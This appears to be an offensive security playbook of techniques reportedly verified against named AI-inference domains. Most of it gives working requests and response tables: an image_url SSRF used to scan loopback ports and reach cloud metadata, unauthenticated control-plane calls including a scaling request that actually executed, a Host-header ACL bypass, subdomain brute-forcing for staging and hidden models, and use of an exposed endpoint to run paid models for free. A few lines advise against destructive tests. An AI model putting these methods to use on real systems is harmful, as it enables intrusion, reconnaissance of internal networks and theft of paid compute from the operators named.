# vLLM / OpenAI-compatible internal-fleet surface: SSRF, control-plane, Caddy ACL, IPAM

Session-verified 2026-10-14 against **experientiallabs.ai / xplabs.ai** (operator-owned gateway:
public `api.experientiallabs.ai` hardened + internal serving fleet `*.xplabs.ai`). These are the
techniques that surfaced REAL unauthenticated exploits on an otherwise well-hardened estate.

## The estate shape (where the weak underbelly hides on these gateways)

- **Public gateway + web platform = hardened** (server-side auth, keyless-recon-only). The
  compromisable surface on THIS class of product is the **internal serving fleet** the public
  gateway routes through — one misconfigured lane = whole crown.
- Fleet pattern: `*.xplabs.ai` with per-provider lanes. `gateway.<d>/{glm,qwen}/v1` were
  **properly keyed (401 Invalid API Key)** while `wm.<d>` (deepseek lane) left `/invocations` +
  `/scale_elastic_ep` + `/generative_scoring` + `/load` + `/detokenize` **completely unauth**.
  **Contrast = proof of misconfiguration**, not platform-wide behavior.
- Keyless `/api/models` **+ `/api/models/<slug>` catalog** leaked the internal `base_url`s and
  provider wiring (see below) — the recon gift that made everything else possible.

## 1. vLLM `image_url` SSRF + COST-FREE status oracle (the big one)

On vLLM-backed OpenAI-compatible inference endpoints, `POST {api}/invocations` (and some
`/v1/chat/completions`) accept an `image_url` content part that the worker **fetches server-side**
and — crucially — **reports the fetched HTTP status / connect result in the error message**.

### The primitive
```
POST https://<internal-gateway>/invocations
{"model":"deepseek-v4-flash",
 "messages":[{"role":"user","content":[
   {"type":"image_url","image_url":{"url":"http://169.254.169.254/latest/meta-data/"}}]}]}
```
→ `422 {"error":{"message":"Failed to fetch media from URL: HTTP 404 error (parameter=image_url,
value=http://169.254.169.254/latest/meta-data/)"}}`
The `HTTP 404 error` is the **server-side fetch result echoed back** — your read oracle.

### Cost-free discrimination (do NOT generate completions — every /invocations call bills the upstream)
Point `image_url` at a target and read the error, **not** a completion:

| `image_url` target | Error/echo | Meaning |
|---|---|---|
| `http://169.254.169.254/...` | `HTTP 404 error` | IMDS reachable; IMDSv2 → 404 without token (hardened, reach confirmed) |
| `http://127.0.0.1:8000/` | `HTTP 404 error` | a real HTTP service answers on that loopback port |
| `http://127.0.0.1:5432/` | `500 Cannot connect to host ... ssl:default [Connect call failed]` | loopback TLS listener there (Postgres etc.) |
| `http://127.0.0.1:9090/` | `500 Cannot connect to host` | closed/filtered |
| `http://<ext-host>:8000/` or `10.0.0.1` | hang/timeout | DNS resolves but connect blocked — SSRF is **loopback/IMDS-scoped**, not arbitrary-everywhere |

### Key discriminators learned
- **Open-service vs closed vs TLS-listener** is fully distinguishable from the error echo → this IS
  a working internal **port scanner** with no token burn.
- **Content-received signal:** when the fetched response is valid HTTP 200 but not an image, the
  error becomes `Failed to load image: cannot identify ...` (NOT connect/404) → you retrieved real
  **content** from an internal endpoint. On the target, `127.0.0.1:8000/{docs,metrics,openapi.json,health}`
  returned this = **loopback-only internal `/docs` + `/metrics` + `/openapi.json` readable via SSRF**
  that the public Host-header ACL hid.
- **401 echo:** `image_url: http://127.0.0.1:8000/v1/models` → `HTTP 401 error` — internal route
  auth-matches public; tells you the internal service still enforces keys (log as coverage).
- ICMP/random external hosts hang (000 timeout) → the fetch egress is filtered beyond loopback/IMDS.
  Run enough targets to characterize the ceiling honestly, then state it.

## 2. Edge control-plane route discovery + validation-not-auth discriminator

- **Mine `/openapi.json` on the internal gateway** (it 200s keyless on the lanes that are
  misconfigured); find `/scale_elastic_ep`, `/is_scaling_elastic_ep`, `/generative_scoring`,
  `/kv_event_sources`, `/detokenize`, `/load`, `/invocations`, `/metrics`, `/version`.
- **Auth-asymmetry discriminator:** inference (`/v1/completions`, `/v1/chat/completions`) → 401,
  but the control-plane routes → 200/400/500. A **400 with a field-name error = auth PASSED and
  body-validation only**; supply the named field and the endpoint executes. `/scale_elastic_ep`
  asked `new_data_parallel_size is required` → `{new_data_parallel_size: 1000}` → `500 "Scale failed"`
  (it actually TRIED an unbounded scale → real execution, not a stub).
- **Contract map = the value:** probe with incrementally-satisfied bodies and read the next missing
  field from each 400. This both proves reachability AND maps the invoke contract WITHOUT triggering
  the destructive value. Do not actually trigger DoS-to-zero or a huge scale on operator infra —
  prove with the safe floor (`1`) and honestly note the destructive test is operator's call.

## 3. Caddy Host-header ACL flip (loopback-only intent defeat)

- `server: Caddy` internal gateway. Public `Host: <host>` on `/metrics`, `/debug/pprof`, `/debug/vars`,
  `/admin`, `/internal` → **403** (loopback-only intent). With `Host: 127.0.0.1` (or `localhost`),
  via `--resolve 127.0.0.1:443:<gw-ip>`, those paths → **200** (empty body for non-existent routes,
  real content for real ones). The ACL is **Host/SNI-bound and remotely spoofable** = internet-reachable
  bypass of a loopback-only surface. Medium finding by itself; pairs with the SSRF above.

## 4. Subscription / free-tier entitlement mining from the model page (hydration leak)

Model page root (`/models/<slug>` on the Next.js app) leaks full promo/subscription config in the
RSC `self.__next_f` flight payload:
`free_input_tokens_per_day|hour`, `free_output_tokens_per_day|hour`, `requires_payment`,
`requires_payment_method`, `verifyChargeUsd`, `badge_style:"allowance"`, `marketedPromo`. Tells you
the exact free-tier gate (e.g. "saved card + $1 settled charge") and the daily/hourly token budget —
primes the card-gate-bypass / credits-overflow escalation, which needs an authenticated context to
test (HYPOTHESIS until proven).

## 5. Staging / hidden-infra discovery (keyless)

- **Subdomain brute common names** on BOTH `<d>` and the internal `<d>` root → found `staging.*` +
  `api.staging.*` on **AWS-direct IPs** (not Cloudflare) with its own 164KB `llms.txt`, keyless
  `/api/models` (404 models), `/openapi.json`, `/health`, and `staff_only` OAuth login.
- **`/.well-known/api-catalog`** (served by default on OpenRouter-style gateways) hands you both the
  `openapi.json` links and the `service-meta` `llms.txt`.
- **Hidden-model leak:** keyless `/api/models` listed models that are "private"/"stealth" by name:
  `gpt-6-astra-2026-09-03-private`, `stealth/ox-alpha`, plus `-latest` rolling aliases. Diff the
  keyless catalog against the documented public list to surface the hidden tier.
- **Modal/GPU infra leak:** catalog provider rows carried a real **Modal** function URL
  (`bespoke-ai-agents--<...>us-east.modal.direct/v1`) — internal serverless GPU endpoint disclosed
  in a public catalog. Scale-to-zero 503 currently; a potential free-GPU if it ever runs authless.
- **Free-AI reachability breadth:** an unauth `/invocations` accepts any catalog slug routed to the
  shared lane (`claude-opus-5`, `deepseek-r1`, glm/qwen/internvl all execute) — a **payment-gate
  bypass across the paid catalog** (`requires_payment:true` models served keyless). `stream:true`
  → SSE → drop-in OpenAI-compatible free endpoint for any SDK.

## 6. The hardened-auth fingerprint (so you stop and don't brute)

Server-side PKCE Supabase/GoTrue is the OPPOSITE of the gratisfy client-side-exposed version:
- **Zero `createClient`/`anonKey`/`supabase` refs in ANY crawled JS chunk** → anon key never ships
  to the browser; GoTrue signup/verify unreachable keyless.
- **`redirect_to` is hardcoded server-side** in the OAuth authorize URL (every `redirect_to=<evil>`
  override ignored) → no OAuth redirect_uri forge (contrast: gratisfy forwarded verbatim).
- Turnstile on every bootstrap route; opaque DB `session_id`; `spend-unlock` → `no_session`.
When these all hold, say "auth wall hardened, no unauth forge" and move on — do NOT brute or
fabricate a bypass. The real find is then the internal fleet, not the auth stack.